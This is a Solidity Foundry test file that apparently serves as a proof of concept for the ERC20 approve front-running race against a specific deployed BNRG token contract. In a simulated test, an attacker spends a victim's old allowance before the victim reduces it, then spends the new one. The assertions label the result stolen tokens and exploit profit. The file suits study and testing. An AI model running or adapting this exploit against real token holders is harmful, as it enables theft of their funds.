// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function approve(address delegate, uint256 numTokens) external returns (bool);
    function allowance(address owner, address delegate) external view returns (uint256);
    function transferFrom(address owner, address receiver, uint256 numTokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint256);
    function transfer(address receiver, uint256 numTokens) external returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a victim address
        victim = address(0x123);

        // Label addresses for clarity
        vm.label(victim, "Victim");
        vm.label(TARGET, "BNRG Token");

        // Get the owner address from the contract
        BNRG token = BNRG(TARGET);
        address owner = token.owner();

        // Impersonate owner to get tokens
        vm.startPrank(owner);
        // Transfer some tokens to victim
        uint256 victimInitialBalance = 2000 * 10**18;
        token.transfer(victim, victimInitialBalance);
        vm.stopPrank();

        // Verify victim has tokens
        assertEq(token.balanceOf(victim), victimInitialBalance, "Victim should have initial tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        BNRG token = BNRG(TARGET);
        uint256 initialBalance = token.balanceOf(address(this));

        // Step 1: Victim approves attacker for 1000 tokens
        vm.prank(victim);
        token.approve(attacker, 1000 * 10**18);

        // Verify approval
        assertEq(token.allowance(victim, attacker), 1000 * 10**18, "Initial approval should be 1000 tokens");

        // Step 2: Victim tries to change approval to 500 tokens
        // We'll front-run this by using the old allowance first

        // Front-run: Use the old allowance of 1000 tokens before it's changed
        uint256 attackerInitialBalance = token.balanceOf(attacker);
        token.transferFrom(victim, attacker, 1000 * 10**18);

        // Verify we got the first 1000 tokens
        assertEq(token.balanceOf(attacker), attackerInitialBalance + 1000 * 10**18, "Should have stolen first 1000 tokens");

        // Step 3: Now the victim's approval change goes through
        vm.prank(victim);
        token.approve(attacker, 500 * 10**18);

        // Verify new allowance
        assertEq(token.allowance(victim, attacker), 500 * 10**18, "New approval should be 500 tokens");

        // Step 4: Use the new allowance
        uint256 attackerBalanceBeforeSecond = token.balanceOf(attacker);
        token.transferFrom(victim, attacker, 500 * 10**18);

        // Verify we got the second 500 tokens
        assertEq(token.balanceOf(attacker), attackerBalanceBeforeSecond + 500 * 10**18, "Should have stolen second 500 tokens");

        // Total stolen: 1500 tokens
        uint256 totalStolen = 1500 * 10**18;
        assertEq(token.balanceOf(attacker), attackerInitialBalance + totalStolen, "Should have stolen total 1500 tokens");
        uint256 finalBalance = token.balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
